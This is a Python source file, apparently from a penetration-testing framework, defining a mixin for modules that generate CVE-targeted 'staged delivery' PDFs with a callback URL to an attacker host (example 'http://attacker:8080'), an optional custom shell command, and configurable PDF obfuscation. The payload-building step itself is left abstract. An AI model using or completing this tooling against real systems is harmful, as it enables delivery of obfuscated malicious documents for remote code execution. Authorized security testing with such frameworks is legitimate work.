"""PDF staged delivery mixin for Auxiliary modules (callback URL, no LHOST/LPORT)."""

from __future__ import annotations

from pathlib import Path
from typing import List

from core.framework.base_module import BaseModule
from core.framework.option import OptChoice, OptString
from core.output_handler import print_info, print_success, print_warning
from core.framework.failure import fail
from lib.pdf import obfuscation as obf
from lib.pdf.generate import validate_callback_host


class PdfRceMixin(BaseModule):
    """Shared options for PDF staged-delivery Auxiliary modules."""

    MODULE_TITLE = "PDF staged delivery generator"
    OUTPUT_BASENAME = "staged.pdf"
    CVE_IDS: List[str] = []

    callback_url = OptString(
        "",
        "Callback or stage base URL (Burp Collaborator, http://attacker:8080, etc.)",
        required=True,
    )
    stage_url = OptString(
        "",
        "Override stage URL (default: CALLBACK_URL)",
        required=False,
    )
    custom_command = OptString(
        "",
        "Custom shell command (custom_cmd mode only)",
        required=False,
    )
    output_dir = OptString("output/pdf-rce", "Output directory", required=False)
    obfuscate = OptChoice(
        "0",
        "PDF obfuscation level (0-7, PDF only)",
        required=False,
        choices=["0", "1", "2", "3", "4", "5", "6", "7"],
    )

    def _stage_url(self) -> str:
        explicit = str(self.stage_url or "").strip()
        if explicit:
            return explicit.rstrip("/")
        base = str(self.callback_url or "").strip().rstrip("/")
        if not validate_callback_host(base):
            raise ValueError(
                "Invalid CALLBACK_URL. Use https://your-collaborator or a valid host/URL."
            )
        return base

    def _output_dir(self) -> Path:
        out = Path(str(self.output_dir or "output/pdf-rce"))
        out.mkdir(parents=True, exist_ok=True)
        return out

    def _output_path(self) -> Path:
        return self._output_dir() / self.OUTPUT_BASENAME

    def generate_pdf_rce_artifacts(self, output_path: Path) -> List[Path]:
        """Override in module subclass to build PDF/SVG and sidecar files."""
        raise NotImplementedError

    def run_pdf_rce(self) -> bool:
        output_path = self._output_path()
        cve_label = ", ".join(self.CVE_IDS) if self.CVE_IDS else "staged"
        mode = str(getattr(self, "payload_mode", "callback"))

        try:
            stage = self._stage_url()
        except ValueError as exc:
            fail.Message(str(exc))
            return False

        print_info(f"[+] {self.MODULE_TITLE}")
        print_info(f"    CVE:      {cve_label}")
        print_info(f"    Mode:     {mode}")
        print_info(f"    Stage:    {stage}")
        print_info(f"    Output:   {output_path.resolve()}")

        try:
            artifacts = self.generate_pdf_rce_artifacts(output_path)
        except ValueError as exc:
            fail.Message(str(exc))
            return False

        level = int(str(self.obfuscate or "0"))
        if level > 0 and output_path.suffix == ".pdf" and output_path.exists():
            obf.obfuscate_pdf(output_path, level)

        print_success(f"    Generated: {output_path.name}")
        for extra in artifacts:
            if extra.resolve() != output_path.resolve():
                print_success(f"    Artifact:  {extra.name}")

        print_warning(
            "AUTHORIZED TESTING ONLY. For reverse shells use the matching Exploit module "
            "(set PAYLOAD / LHOST / LPORT — listener starts automatically)."
        )
        return True
